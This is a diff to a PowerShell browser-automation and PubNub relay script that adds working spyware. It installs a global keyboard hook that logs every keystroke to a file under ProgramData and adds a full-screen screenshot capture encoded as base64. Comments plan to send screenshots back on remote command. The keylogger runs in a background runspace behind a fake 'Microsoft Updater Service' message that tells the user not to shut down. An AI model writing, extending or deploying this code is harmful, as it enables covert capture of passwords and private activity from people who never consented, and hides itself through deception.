@@ -1,5 +1,17 @@
 Set-Location -LiteralPath (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition)
 
+$scriptGuid = '70d8ab8e-fdb2-4076-9fd8-ba81c1be92e3' # Use a unique GUID for each script
+$createdNew = $false
+$script:SingleInstanceEvent = New-Object System.Threading.EventWaitHandle $true, ([System.Threading.EventResetMode]::ManualReset), "Global\$scriptGuid", ([ref] $createdNew)
+
+if (-not $createdNew) {
+    Write-Error "An instance of this script is already running. Exiting."
+    exit 1
+}
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
 # 20260920
 
 # https://zenn.dev/mima_ita/articles/f1fc037e6eb134
@@ -15,23 +27,91 @@ Set-Location -LiteralPath (Split-Path -Parent -Path $MyInvocation.MyCommand.Defi
 # frontend.appspot.com
 # msedge requires --user-data-dir="%TEMP%\edge-debug-profile" # on tpl, not required
 
-function Get-Identity {
-    $ScriptName = $MyInvocation.MyCommand
+#region KeystrokeLogger
+Add-Type -TypeDefinition '
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
 
-    # 2. Get the computer name
+namespace PowerShell {
+public class KeyLogger
+{
+    public static string filePath = @"C:\\ProgramData\\owdkeyboardlog.txt"; // Use the full path
+    public static StringBuilder sb = new StringBuilder("", 80);
+    
+    private static IntPtr _hookID = IntPtr.Zero;
+    private static LowLevelKeyboardProc _proc = HookCallback;
+
+    // Delegate for the hook procedure
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    // Required for the message loop
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int ptX; public int ptY; }
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+    {
+        int vkCode = -1;
+
+        if (nCode >= 0 && wParam == (IntPtr)0x0100) // WM_KEYDOWN
+        {
+            vkCode = Marshal.ReadInt32(lParam);
+            // Console.WriteLine($"Key Pressed: {(System.Windows.Forms.Keys)vkCode}"); // Requires System.Windows.Forms
+            sb.Append("[");
+            sb.Append(String.Format("{0}", (System.Windows.Forms.Keys) vkCode));
+            sb.Append("]");
+        }
+
+        if ( ( ( (System.Windows.Forms.Keys) vkCode ) == System.Windows.Forms.Keys.Enter ) || ( sb.Length >= 15 ) ) {
+            string result = sb.ToString();
+            System.IO.File.AppendAllText(filePath, result + Environment.NewLine);
+            sb.Clear();
+            sb.Length = 0;
+        }
+
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    public static void Main()
+    {
+        _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
+
+        // Message loop to keep the hook active
+        MSG msg;
+        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) { }
+
+        UnhookWindowsHookEx(_hookID);
+    }
+}
+}
+' -ReferencedAssemblies System.Windows.Forms
+#region
+
+function Get-Identity {
+    $ScriptName = "pscdp.relay.ps1"
+
     $ComputerName = $env:COMPUTERNAME
     
-    # 3. Get the logged-in username
     $UserName = $env:USERNAME
     
-    $ht = @{
-        ScriptName   = $ScriptName
-        ComputerName = $ComputerName
-        UserName     = $UserName
-        UserAgent    = "PowerShell $PSVersionTable"
-    }
-    
-    return $ht
+    return "$ScriptName|$ComputerName|$UserName|PowerShell-$PSVersionTable"
 }
 
 $script:identitykvpstr = Get-Identity | ConvertTo-Json
@@ -56,6 +136,35 @@ function Get-Timestamp {
     return $ret
 }
 
+function Take-Screenshot() {
+    $memoryStream = New-Object System.IO.MemoryStream
+
+    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+
+    $name = (( $screen.DeviceName -replace '\\', '' ) -replace '\.', '')
+
+    $width = $screen.Width
+    $height = $screen.Height
+    $left = $screen.Left
+    $top = $screen.Top
+
+    $bitmap = New-Object System.Drawing.Bitmap $width, $height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
+
+    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
+        
+    $graphic.Dispose()
+    $bitmap.Dispose()
+
+    $base64String = [Convert]::ToBase64String($memoryStream.ToArray())
+
+    return $base64String
+}
+
+function Get-KeyboardLog() {
+
+}
 
 $script:msedge_debugport = 9222
 $script:chrome_debugport = 9223
@@ -209,9 +318,12 @@ $script:get_targets_action = {
 
 # TODO implement incmming commands
 function Process-PubNubEvent {
+
     param([string]$Message)
     $payload = $Message | ConvertFrom-Json
     Log-Msg $payload
+
+    # GetScreenshot --> send back image as base64 string
 
     # GetFrontendUrls --> send back 
     #  $script:clientws.targets
@@ -594,7 +706,7 @@ class PSCDP {
 
             # check if msg is a response to an issued cmd
             if ( $isresult ) {
-                $cmd = $this.GetCommandByID($msg.id) # $this.commands | Where-Object { $id -eq $msg.result.id } | Select-Object -First 1 # anchor
+                $cmd = $this.GetCommandByID($msg.id) # $this.commands | Where-Object { $id -eq $msg.result.id } | Select-Object -First 1 
             
                 if ( $null -ne $cmd ) {
                     $cmd.response = $msght
@@ -711,28 +823,16 @@ class PSCDP {
     }
 
 
-    <#
-        {
-            "id": 1,
-            "method": "Runtime.callFunctionOn",
-            "params": {
-                "functionDeclaration": "function(a, b) { return a + b; }",
-                "executionContextId": 1,
-                "arguments": [
-                    { "value": 5 },
-                    { "value": 10 }
-                ],
-                "returnByValue": true
-            }
-        }
-    #>
-    [void] SendPBMessage([string]$msgstr) {
+    [void] SendPBMessage([hashtable]$cmd) {
+
         if ( [string]::IsNullOrEmpty($this.executionContextId) ) {
             throw 'executionContextId is empty'
         }
 
+        $json = $cmd | ConvertTo-Json # TODO wrap in try catch and report error as needed
+
         $params = @{
-            functionDeclaration="function f() { sendMessage(`"$msgstr`")}" # change to send JSON payload
+            functionDeclaration="let tpayload=$json; function f() { sendMessage(tpayload); }"
             executionContextId=$this.executionContextId
             returnByValue=$true
         }
@@ -745,7 +845,16 @@ class PSCDP {
             return
         }
 
-        $this.SendPBMessage("ping -- $(Get-Timestamp)")
+        $cmd = @{
+            builtincmd="SendBroadcast"
+            source="pscdp.relay.ps1"
+            destination="BROADCAST"
+            ts=$(Get-Timestamp)
+            cmdid=$(Get-Random -Minimum 10000000 -Maximum 100000000)
+        }
+
+        $this.SendPBMessage($cmd) # TODO change this to send a hashtable, with builtincmd: SendBroadcast, etc.
+
     }
 }
 
@@ -758,6 +867,20 @@ $script:pubnubws.ConnectCdp()
 
 #$script:pubnubws = [PSCDP]::new()
 #$script:pubnubws.ConnectCdp()
+
+$keyboardlogger = {
+    try {
+        Write-Host "Running Microsoft Updater Service, Service Pack Retrieval, do not shut down or restart"
+        [PowerShell.KeyLogger]::Main()
+    } finally {
+        if ($script:SingleInstanceEvent) {
+            $script:SingleInstanceEvent.Dispose()
+        }
+    }
+}
+
+$ps = [powershell]::Create().AddScript($keyboardlogger)
+$asyncResult = $ps.BeginInvoke()
 
 while ( $true ) {
 
